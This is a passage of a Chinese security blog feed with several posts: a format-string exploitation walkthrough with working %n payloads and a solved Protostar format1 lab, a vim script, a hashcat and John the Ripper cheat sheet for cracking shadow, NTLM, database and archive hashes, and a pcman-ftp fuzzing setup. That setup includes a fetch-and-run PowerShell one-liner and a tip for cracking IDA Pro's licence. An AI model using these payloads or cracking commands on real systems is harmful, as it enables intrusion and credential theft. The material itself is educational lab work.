0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
0xbffff730:     0xb7ff1040      0x08049668      0xbffff768      0x080484d9
0xbffff740:     0xb7fd8304      0xb7fd7ff4      0x080484c0      0xbffff768
0xbffff750:     0xb7ec6365      0xb7ff1040      0x00000000      0xbffff758
0xbffff760:     0x080484c0      0x00000000      0xbffff7e8      0xb7eadc76
0xbffff770:     0x00000001      0xbffff814      0xbffff81c      0xb7fe1848
---------------end------------------
同样可以看到0xbffff758处存放的0即为flag的值,而0xbfff75c处存放的为p,要实现将0xbffff75c处的0xbffff758指向的内容修改为2000,也即要实现0xbffff75c处,[0xbffff758]=2000

0xbffff75c与printf的第二个参数的地址0xbffff6e4相差0xbffff75c-0xbffff6e4=0x78=30个栈单元大小,也即flag为printf的第31个参数,p为printf的第32个参数

所以要将第32个参数指向的内容修改为2000,这样就可以实现将第31个参数修改为2000

构造&quot;%x&quot;*30+%n,其中前面30个%x中要输出2000个长度,可以通过修改宽度输出大小实现,eg.%1768x+&quot;%x&quot;*29+%n(1768+29*8=2000)

第六个参数为开始存放scanf由终端输入的格式化字符串,第32个参数的数据为重要的不能被scanf由终端输入覆盖的位置,所以输入最多可以输入第6到第31个参数所占的空间大小,共32-6+1=27个栈单元大小=27*4=108个字节

如果由scanf从终端输入超过108个字节的格式化字符串,第109到112个字节将覆盖printf的第32个参数,这样printf执行完以后会将2000写入到109-112个字节被覆盖的值的地址空间中,所以如果输入超过108个字节也可以,但是必须保证输入的第109-112个字节为printf第32个参数原本的值,如果直接将printf第31个参数覆盖成2000,会在printf执行完以后被%n的作用改写成其他值,所以直接在printf的第31个参数位置输入2000是不行的

最好的办法是输入长度不超过108个字节,如
%1768x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n

但是发现这样不会打印出good,gdb尝试打印发现是在printf打印的时候,如果%x对应的要打印的最高位为0,将被省略去这个&quot;0&quot;,所以改成下面的形式,强制8位对应每个%x

%1768x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n(93个字节&amp;lt;108个字节)
成功打印出good,实现了将flag修改为2000,这样在aslr开启的时候同样有效,因为这里用的是相对偏移

在aslr没有开启时,为了进一步缩短scanf由终端输入的格式化字符串长度的大小(小于108即可),达到精确打击,直接改写printf的第32个参数指向的内存空间的值(也即实现修改flag),可以这样做:

在scanf由终端输入的格式化字符串的开头写上printf的第32个参数的值,也即p的值,也即flag存放的地址
scanf由终端输入:&quot;0xbffff758&quot;(对应printf第6个参数)+%8x(读第2个参数)+%8x(读第3个参数)+%8x(读第4个参数)+%1972x(读第5个参数)+%n(写进第6个参数指向的内存空间)
也即&#39;\x58\xf7\xff\xbf&#39;%8x%8x%8x%1972x%n
其中4+8*3+1972=2000
但是0xbffff758是gdb调试时候的第32个参数的值,与md单独运行时并不相同,需要找出md直接运行时的printf的第32个参数的值替换即可

scanf由终端输入%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xAA%x(31个%x)

最后第31个AA%x处对应输出为:AAbffff788,也即实际运行时printf的第32个参数为0xbffff788

也可以通过http://drops.wooyun.org/papers/9426中查看printf第2个参数的值+(第32个参数与第2个参数相减的差)的方法来计算出第32个参数的大小

构造:&#39;\x88\xf7\xff\xbf&#39;%8x%8x%8x%1972x%n
python -c &quot;print &#39;\x88\xf7\xff\xbf&#39;+&#39;%8x%8x%8x%1972x%n&#39;&quot; | ./md
成功修改了flag的值为2000,打印出了good!

或者更短一些,利用%5\$n(直接参数访问)直接写入到printf第六个参数中
也即:
&#39;\x88\xf7\xff\xbf&#39;%1996x%5\$n

python -c &quot;print &#39;\x88\xf7\xff\xbf&#39;+&#39;%1996x%5\$n&#39;&quot; | ./md
成功修改了flag的值为2000,打印出了good!

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-&quot;&gt;0x03 提炼方法&lt;/h3&gt;

&lt;p&gt;环境:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;x32系统下,在call printf这一句汇编语句执行前
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x123456780x40404040&quot;&gt;方法1&amp;gt;精确打击:在0x12345678地址中写入0x40404040&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(适用aslr关闭)
1&amp;gt;输入python -c &quot;print &#39;AAAABBBB&#39;+&#39;%8x&#39;*20&quot;

    0.输入python -c &quot;print &#39;%3\$x&#39;&quot;查看是否支持\$
    
    1.如果20个栈单元中还没有4141414142424242出现,再将20变大,直到可以看到4141414142424242
    
    2.也可以先用gdb加载,在main函数帧中的call printf那一句下断点,然后x/20x $esp,看不到则将20变大,直到可以看到
    
    3.计算出AAAABBBB(人工构造的格式化串的起始位置)的出现位置为第几个打印值,假设为第num个,便可知道AAAABBBB的出现位置在
      栈中相当于第num个printf的参数的位置,便可得到AAAABBBB在栈中的位置与printf的第一个参数的位移差为(num-1)*4
      (第一个参数为人工构造的格式化串&quot;AAAABBBB%x%x...%x&quot;的指针)
    
    4.有时候遇到栈中4141414142424242的位置会随着输入的长度的不同而变化,这时可以在保证输入的长度不变的基础下调整输入的
      形式(也即调整%x和%n的位置).

2&amp;gt;构造python -c &quot;print &#39;AA\x78\x56\x34\x12BB&#39;+&#39;%(value-4)x&#39;+&#39;%(num)\$n&#39;&quot;

    这里假设在栈中某一单元中,内容为42424141,也即刚好是AAAABBBB中的中间4个字符覆盖了该栈单元的内容
    value为需要在0x12345678地址中写入的值0x40404040,value-8=1077952568,假设AAAABBBB中的AABB的出现位置为第6个打印数
    的位置,也即num=6,则构造如下:
    
    python -c &quot;print &#39;AA\x78\x56\x34\x12BB&#39;+&#39;%1077952568x&#39;+&#39;%5\$n&#39;&quot;
    
    如果不支持\$则用:
    python -c &quot;print &#39;AA\x78\x56\x34\x12BB&#39;+&#39;%1077952565x&#39;+&#39;%1x&#39;*3+&#39;%n&#39;&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;x12345680x40404040&quot;&gt;方法2&amp;gt;动态打击:在0x1234568中写入0x40404040&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(适用于可找到某一栈单元内容为0x12345678的情况,找不到的情况用方法1,该方法可用于aslr开启下)

0&amp;gt;输入python -c &quot;print &#39;%3\$x&#39;&quot;查看是否支持\$

1&amp;gt;找到0x12345678在栈中的位置,用方法1中的两种方法都可以查找(但是如果不是0x12345678这样的比较有特征的可以一眼看出来的,
  eg.0x40528315,如果需要在栈中查找0x40528315,od中有这个功能,gdb暂不知道,可在使用%x打印栈中数据后尝试用tmux的vim复制
  模式搜索)

  计算0x12345678在栈中的位置为printf的第几个参数的位置,假设为第32个,也即第31个打印值

2&amp;gt;构造python -c &quot;print &#39;%(value1)x&#39;+&#39;%8x&#39;*29+&#39;%n&#39;&quot;
      其中value1=1077952576(0x40404040的十进制值)-29*8=1077952344,如下:
      %1077952344x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%n
  或更短的(需要\$支持):
      python -c &quot;print &#39;%(value1)x&#39;+&#39;%31\$n&#39;&quot;
      %1077952576x%31\$n

3&amp;gt;如果不能在栈中某一单元中找到0x12345678而是在连续两个栈单元中存在,eg:
    --------
    56341200
    --------
    56498078
    --------
  这样可以尝试更改输入使0x12345678刚好出现在一个栈中,eg.输入:
  python -c &quot;print &#39;B%(value1)x&#39;+&#39;%8x&#39;*29+&#39;%n&#39;&quot;
  但这不一定有效
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-&quot;&gt;0x04 小试牛刀&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;target:
https://exploit-exercises.com/protostar/format1/

source:
--------------format1.c-----------------
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf(&quot;you have modified the target :)\n&quot;);
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
-----------------end--------------------

mykey:
        objdump -t format1
        find target address:0x8049638
        ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.%x&#39;&quot;`
        -------------output:--------------
        AAAABBBB804960c.bffff788
        --------------end-----------------
        ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%2\$x&#39;&quot;`
        ----------------output:----------------
        AAAABBBB
        ------------------end------------------
        结论:这里不能用\$
        ./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*140&quot;`
        ---------------output:----------------
        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7be.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.d5f4313f.ffa7a72f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b4.bffff7be.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.d3000000.e844f82d.2820150f.79187f9d.69c015e8.363836.0.6f662f2e.74616d72.41410031.42424141.78254242.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
        ------------------end-----------------
        find 42424141 in the 132th print location
        -----------------output:----------------
        AAAABBBB804960c.bffff5e8.8048469.b7fd8304.b7fd7ff4.bffff5e8.8048435.bffff7bb.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff668.b7eadc76.2.bffff694.bffff6a0.b7fe1848.bffff650.ffffffff.b7ffeff4.804824d.1.bffff650.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff668.b3c0b28e.9993249e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff694.8048450.8048440.b7ff1040.bffff68c.b7fff8f8.2.bffff7b1.bffff7bb.0.bffff96b.bffff976.bffff984.bffff999.bffff9a9.bffff9cb.bffff9d8.bffff9eb.bffff9f5.bffffee5.bffffef9.bfffff3b.bfffff52.bfffff63.bfffff74.bfffff7f.bfffff87.bfffff94.bfffffa8.bfffffdc.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffff79b.1f.bffffff2.f.bffff7ab.0.0.84000000.a999d71b.1ef8a615.f39ada32.69642dc2.363836.662f2e00.616d726f.41003174.42414141.25424242.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
        --------------------end-----------------
        find 42414141 in the 131th print location
        结论:AAAABBBB的在栈中出现的位置会随着输入的长度不同而变化
        根据./format1 `python -c &quot;print &#39;AAAABBBB&#39;+&#39;%x.&#39;*140&quot;`中132个输出为42424141:
        ./format1 `python -c &quot;print &#39;AA\x38\x96\x04\x08BB&#39;+&#39;%x.&#39;*131+&#39;%n.&#39;+&#39;%x.&#39;*8&quot;`
        output:
        .....you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Sun, 26 Jun 2016 00:00:00 +0800</pubDate>
        <link>/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/</link>
        <guid isPermaLink="true">/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2%E6%BC%8F%E6%B4%9E/</guid>
        
        <category>格式化串</category>
        
        <category>format</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>vim自动换标点</title>
        <description>&lt;p&gt;将下面复制到vimrc文件中,f2快捷键可将当前文件中标点符号换成英文符号,打开md文件时自动将全文的中文标点符号换成英文符号,用于写md文件时中文标点符号不美观的问题&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;au BufRead *.md call Biaodian() &amp;lt;CR&amp;gt;

map &amp;lt;F2&amp;gt; :call Biaodian() &amp;lt;CR&amp;gt;
function Biaodian()
    %s/“/&quot;/g
    %s/”/&quot;/g
    %s/，/,/g
    %s/。/./g
    %s/？/?/g
    %s/〈/&amp;lt;/g
    %s/〉/&amp;gt;/g
    %s/（/(/g
    %s/）/)/g
    %s/：/:/g
    %s/；/;/g
    %s/‘/&#39;/g
    %s/‘/&#39;/g
    %s/！/!/g
    endfunction
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 23 Jun 2016 00:00:00 +0800</pubDate>
        <link>/vim/2016/06/23/vim%E8%87%AA%E5%8A%A8%E6%8D%A2%E6%A0%87%E7%82%B9/</link>
        <guid isPermaLink="true">/vim/2016/06/23/vim%E8%87%AA%E5%8A%A8%E6%8D%A2%E6%A0%87%E7%82%B9/</guid>
        
        <category>vim</category>
        
        <category>script</category>
        
        <category>vimrc</category>
        
        
        <category>vim</category>
        
      </item>
    
      <item>
        <title>hashcat&amp;john</title>
        <description>&lt;p&gt;knowledge from klion&lt;/p&gt;

&lt;h3 id=&quot;x01-hashcat&quot;&gt;0x01 hashcat&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在线hash解密网站(基本上常用的一些hash类型它都支持):
	http://verifier.insidepro.com
	http://cmd5.com
	
一款帮我们大概识别hash类型的小脚本:
	hash-identifier  执行执行,而后把要识别的hash粘进去回车即可
	
	
注意,必须提前安装好对应的显卡驱动(AMD/英伟达根据自己实际选择),然后下载oclhashcat:
	https://hashcat.net/files/oclHashcat-2.01.7z
	https://hashcat.net/files/cudaHashcat-2.01.7z

hashcat简介(这里暂以hashcat为例,实战中推荐买块好显卡,用oclhashcat,两者选项稍稍有些不同,实际用的时候记得看下帮助):
	hashcat 	基于CPU破解
	oclhashcat  基于GPU破解
	
hashcat常用选项(如果提示要升级到新版本,修改下系统时间到2010年之前即可):
	-a  指定要使用的破解模式
	-m  指定要破解的hash的类型,基本是支持市面上流行的所有散列类型
	-o  指定破解成功后的hash及对应明文密码的存放位置
	--username  忽略hash文件中的用户名
	--remove    移除已经破解成功的hash
	-r			支持自定义破解规则
	
hashcat支持的几种破解模式:

	0 = Straight    	普通字典模式,后面可以连续跟多个字典文件
    1 = Combination
    2 = Toggle-Case
    3 = Brute-force		基于自定义掩码的破解
    4 = Permutation
    5 = Table-Lookup
    8 = Prince
	
hashcat掩码字符所代表的含义及掩码具体的使用方法:
  
   ?l = abcdefghijklmnopqrstuvwxyz
   ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
   ?d = 0123456789
   ?s =  !&quot;#$%&amp;amp;&#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}~
   ?a = ?l?u?d?s
   ?b = 0x00 - 0xff

   -1,  --custom-charset1=CS     User-defined charsets
   -2,  --custom-charset2=CS     Example:
   -3,  --custom-charset3=CS     --custom-charset1=?dabcdef : sets charset ?1 to 0123456789abcdef
   -4,  --custom-charset4=CS     -2 mycharset.hcchr : sets charset ?2 to chars contained in file


基于普通的基于字典的爆破(普通md5的hash):
	# hashcat -a 0 -m 0  /root/Desktop/md5.txt /usr/share/wordlists/weakpass.txt
	
基于掩码的爆破(先先逐个位进行尝试破解,一般都是字母数字这种形式的,如果hash比较多的情况下,直接从9位开始即可):
	前三位数字,后三位小写字母
	# hashcat -a 3 -m 0 /root/Desktop/md5numword.txt  ?d?d?d?l?l?l
	
	6位的纯字母
	# hashcat -a 3 -m 0 /root/Desktop/md5word.txt  -1 ?l ?1?1?1?1?1?1
	
	6位纯数字
	# hashcat -a 3 -m 0 /root/Desktop/md5num.txt  -1 ?d ?1?1?1?1?1?1

	6位的小写字母和数字的随机组合
	# hashcat -a 3 -m 0 /root/Desktop/md5.txt  -1 ?l?d ?1?1?1?1?1?1
	
破解普通md5系列(filezilla为例):
	# hashcat -a 3 -m 0 /root/Desktop/md5.txt -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/md5res.txt
	
破解sha系列(rhel6.5 shadow为例[实际hash类型为SHA512]):
	# hashcat -a 3 -m 1800 /root/Desktop/linux.txt -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/linuxres.txt
	
破解mysql 4/5 用户hash(记得把开头的*,去掉 [User]):
	# hashcat -a 3 -m 300  /root/Desktop/mysql.txt -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/mysqlres.txt
	
破解mssql系列([2000,2005,2008] / [2012,2014] (sys.sql_logins)):
	2005
	# hashcat -a 3 -m 132  /root/Desktop/mssql2005.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/2005.txt
	
	2008 测试过程中,2008的hash用的是2005的hash类型,也一样可以成功
	# hashcat -a 3 -m 132  /root/Desktop/mssql2008.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/2008.txt
	
破解ntlm(注意这里只取出ntlm的值即可,也就是把hash里面的lm的值去掉):
	# hashcat -a 3 -m 1000  /root/Desktop/ntlm.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/ntlmres.txt
	
破解wpa/wpa2:
	
破解wordpress:
	# hashcat -a 3 -m 400  /root/Desktop/wordpress4.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/wordpressres.txt
	
破解joomla25:
	# hashcat -a 3 -m 400  /root/Desktop/joomla25.txt  -1 ?l?d ?1?1?1?1?1?1 -o /root/Desktop/joomla25res.txt
	
破解discuz(oclhashcat才有此hash类型):

破解oracle 11g 用户hash:

破解skeype密码hash:

破解postgresql用户hash[pg_shadow]:

破解ser-U:

关于普通加盐的爆破:
	看加盐的位置,再选择相应的类型即可
	
基于半猜解查询的爆破(6 模式 [Hybrid dict + mask] oclhashcat才有此选项):



建议用hashcat破解的一般流程总结(快速破解常规口令,速度快):
	例如: 破解6到10位的大小写字母数字组成的密码,可以遵循以下顺序
	
	对于纯数字或者字母的hash破解:
	6位纯数字   
	6位纯小写字母
	6位纯大写字母
	7位纯数字
	7位纯小写字母
	7位纯大写字母
	8位纯数字
	8位纯小写字母
	8位纯大写字母
	9位纯数字
	9位纯小写字母
	9位纯大写字母
	10位纯数字
	10位纯小写字母
	10位纯大写字母
	11位纯数字
	11位纯小写字母
	11位纯大写字母
	用以上规则没有跑出来的hash,可以继续下面的规则……
	
	对于6位数字字母混合密码的简单拆分:
	前1位字母后5位数字
	前2位字母后4位数字
	前3位字母后3位数字
	前4位字母后2位数字
	前5位字母后1位数字
	
	对于7位数字字母混合密码的简单拆分:
	前1位字母后6位数字
	前2位字母后5位数字
	前3位字母后4位数字
	前4位字母后3位数字
	前5位字母后2位数字
	前6位字母后1位数字
	
	对于8位数字字母混合密码的简单拆分:
	前1位字母后7位数字
	前2位字母后6位数字
	前3位字母后5位数字
	前4位字母后4位数字
	前5位字母后3位数字
	前6位字母后2位数字
	前7位字母后1位数字
	
	对于9,10,11,12位数字字母混合密码的拆分也是一样……
	这里,我只是假设密码都是纯数字字母的,在实际的hash破解过程中,你还可以把特殊字符加入在内,再重新组合破解规则……
	
	
小结:
	当然,你也可以不用我建议的这种规则,因为在hashcat中有自定义破解规则的选项

	比如:我们就知道这个密码是9位的,里面可能有大小写字母,数字,特殊字符
		 但具体哪一位上是数字,字母,特殊字符我并不知道,自定义规则就发挥了他的作用……
		 但,我想说的是,这样无疑是非常耗时的,如果你像我前面已经规定好了哪一位是数字
		 哪一位是字母的话,它的破解速度就会成倍的提升,除非你真的在试完前面所有的规则之后都没跑出来,这时候再尝试自定义规则也未尝不可……
		 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-john&quot;&gt;0x02 john&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在kali 2016.1 上的安装john:

# sudo apt-get install libssl-dev
# cd john-1.8.0-jumbo-1/src/
# ./configure
# make &amp;amp;&amp;amp; make -s
# cd ../run
# ./john --test     测试当前机器的解密速度
# 最后看到全部通过,证明安装已经基本成功

john 破解规则设置文件(每种模式下的具体的破解规则,请仔细查看该文件,C语言格式的):
	# vi john/run/john.conf
	
john运行以后会在当前目录产生一个john.pot文件,用来缓存数据,如果想重新破解,直接把这个文件删除即可
	# rm -fr john.pot
	
常用选项:
	--wordlist		指定用来破解hash的字典,即字典模式
	--single  		简单破解模式,也是默认的运行模式,根据用户名进行一些简单的变形猜解
	--incremental 	逐个遍历模式
	--external		自定义破解规则模式
	--restore		依照上次的破解进度接着执行破解
	--show 			显示已经破解出来的hash及对应的明文密码
	--users			只破解指定用户的hash
	--groups		只破解指定用户组的hash
	--shells		只破解指定shell的hash
	--format		指定要破解的hash的类型
	--stdout		从别处重定向到指定的hash
	
合并linux系统中的用户/组和密码hash配置文件(在不知道具体类型的情况下,直接john跟上hash文件即可,当识别类型以后,简单模式破不出来,再incremental):
	# unshadow /etc/passwd /etc/shadow &amp;gt; /root/Desktop/johnuser.txt
	# unshadow /etc/group /etc/gshadow &amp;gt; /root/Desktop/jonhgroup.txt
	
破解linux系统用户hash:
	一般简单模式破解(如果不手工指定hash类型,john也会帮你自动识别,并提示你):
		# ./john   /root/Desktop/linux.txt --format=sha512crypt --incremental
		# ./john /root/Desktop/group.txt   --format=sha512crypt --incremental
		
	指定用户名破解:
		# ./john /root/Desktop/johnuser.txt  --users=alex --format=sha512crypt --incremental
		# ./john /root/Desktop/johnuser.txt --users=jack,alex --format=sha512crypt --incremental
		
	指定shell破解:
		# ./john /root/Desktop/johnuser.txt  --shells=/bin/rbash --format=sha512crypt --incremental
	
	显示已经破解的hash:
		# ./john  /root/Desktop/tmp.txt  --show
		
破解ntlm(2008):
	# ./john /root/Desktop/ntlm.txt --format=NT2 --incremental

破解mssql系列数据库用户hash:
	2005:
		# ./john /root/Desktop/2005.txt  --format=mssql05  --incremental
		
	2008:
		# ./john /root/Desktop/2008.txt  --format=mssql05  --incremental
		
	2012:
		# ./john /root/Desktop/2012.txt  --format=mssql12  --incremental
	
破解mysql系列数据库用户hash:
	# ./john /root/Desktop/mysql.txt  --format=mysql-sha1  --incremental
	
破解office系列密码(2010):
	# ./office2john.py /root/Desktop/test.docx &amp;gt; /root/Desktop/officehash.txt
	# ./john /root/Desktop/officehash.txt --format=office --incremental

破解drupal7用户密码hash:
	# ./john /root/Desktop/drupal7.txt --format=Drupal7  --incremental
	
破解rar系列密码hash(rar,rar5):
	# ./rar2john /root/Desktop/rar.rar &amp;gt; /root/Desktop/rarhash.txt
	# ./john /root/Desktop/rarhash.txt --format=rar --incremental
	# ./john /root/Desktop/rar5hash.txt --format=rar5 --incremental
	
破解zip密码hash:
	# ./zip2john /root/Desktop/zip.zip &amp;gt; /root/Desktop/ziphash.txt
	# ./john /root/Desktop/ziphash.txt --incremental --format=PKZIP

破解pdf密码hash:
	# ./pdf2john.py /root/Desktop/CMD.pdf &amp;gt; /root/Desktop/pdfhash.txt
	# ./john /root/Desktop/pdfhash.txt

破解filezilla(md5)用户密码hash:
	# ./john /root/Desktop/MD5.txt --format=Raw-MD5 --incremental
	# ./john /root/Desktop/MD5.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/weakpass.txt
	
破解wpa/wpa2hash:
	# ./john --stdout --incremental:all | aircrack-ng -b apmac -w - wpa2*.cap

破解grub hash:
	
破解radmin用户hash:

破解oracle 11g 以下数据库用户hash:
	
破解ssh key hash: 
	
破解7z密码hash:

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 22 Jun 2016 00:00:00 +0800</pubDate>
        <link>/crack/2016/06/22/hashcat/</link>
        <guid isPermaLink="true">/crack/2016/06/22/hashcat/</guid>
        
        <category>hashcat</category>
        
        
        <category>crack</category>
        
      </item>
    
      <item>
        <title>pcman-ftp初战漏洞挖掘</title>
        <description>&lt;h3 id=&quot;x01-install-binnavi&quot;&gt;0x01 install binnavi&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/google/binnavi
http://www.freebuf.com/sectool/75529.html

https://github.com/google/binnavi/releases
http://malwareandmore.blogspot.kr/2015/08/binnavi-install-on-windows.html
https://blog.because-security.com/t/development-environment-for-binnavi-with-a-package-manager-windows/34(better)

直接下载https://github.com/google/binnavi/releases里面的binnavi-all.jar,放到windows下双击,运行不成功说明缺少环境,再从其他几个链接中学习安装
使用教程https://www.zynamics.com/binnavi/manual/html/tutorial.htm
    
最佳安装方案:
将binnavi安装到win2003上
直接双击运行https://github.com/google/binnavi/releases中的binnavi-all.jar,
并将这个链接里面的zynamics_binexport_9.plw和zynamics_binexport_9.p64放入idapro6.8的plugin目录中
将这个链接https://github.com/google/binexport/releases里面的copy_to_ida_root_windows.zip解压后放到ida的根目录下
ida pro6.8的安装如果因为没有注册使得ida pro无法加载binexport9插件(看不到Edit|Plugin|BinExport9说明没有加载成功),则替换ida安装目录下的ida.key文件为这个链接(https://gist.github.com/TheCjw/9f6f7544f33f292db20e)中的ida.key文件,并将系统时间改成若干年前完成ida pro的破解

如果提示有什么问题,再根据
https://blog.because-security.com/t/development-environment-for-binnavi-with-a-package-manager-windows/34
这里面的方法安装缺失依赖,可能不用全部安装完就可以再次尝试直接双击binnavi-all.jar而成功运行

安装postgresql到win2003上会失败,解决方法http://blog.itpub.net/29598413/viewspace-1258961/

以上安装知识理应足够,如需还有这个链接
http://pan.baidu.com/s/1c2Jmtag
里面的readme.md文件有关于安装的问题,另外这个链接里面有大多数需要的依赖环境打包好了

实例安装:(win2003)(事后觉得2中的命令可以不运行,因为binnavi-all.jar为最后编译的结果文件,而2中只是为了编译才做的过程)
0.my_vinnavi从这里下载:http://pan.baidu.com/s/1c2Jmtag
1.安装my_binnavi中的install binnavi on win2003里面的两个exe
2.@powershell -NoProfile -ExecutionPolicy Bypass -Command &quot;iex ((new-object net.webclient).DownloadString(&#39;https://chocolatey.org/install.ps1&#39;))&quot; &amp;amp;&amp;amp; SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin
  choco install maven
  choco install ant
  choco install gradle
3.安装jdk8(jdk6不成功),并添加对应C:\Program Files\Java\jdk1.8.0_91\bin和C:\Program Files\Java\jre1.8.0_91\bin到环境变量path,新建一个环境变量JAVA_HOME为C:\Program Files\Java\jdk1.8.0_91\
4.安装idapro6.8,替换key文件,修改本机时间为几年前,将copy_to_ida_root_windows.zip里面的文件放入idapro根目录(重要,没有这步Edit|Plugin中看不到BinExport9),并将binexport的两个文件(zynamics_binexport_9.plw和zynamics_binexport_9.p64)放入idapro的plugin目录
5.安装my_binnavi中的postgresql(x86),数据库用户名和密码设为postgres,将win2003中的c:\program files\postgresql目录设置为everyone有所有权限
6.以管理员身份(否则在binnavi运行后无法import idb文件)运行binnavi-all.jar(win2003下右键以不受限方式打开cmd.exe,然后运行binnavi-all.jar)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-fuzz-target-app&quot;&gt;0x02 fuzz target app&lt;/h3&gt;

&lt;h4 id=&quot;about&quot;&gt;about&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;target link:
    https://www.exploit-db.com/exploits/39662/
target ftp app(pcmanftp):
    https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
ftp fuzz tool:
    http://www.infigo.hr/files/ftpfuzz.zip

challenge:
    尝试找到pcmanftp除了exploit-db中介绍的已经存在的漏洞以外其他的漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;fuzz&quot;&gt;fuzz&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;安装ftpfuzz(实验中安装到192.168.3.77中)
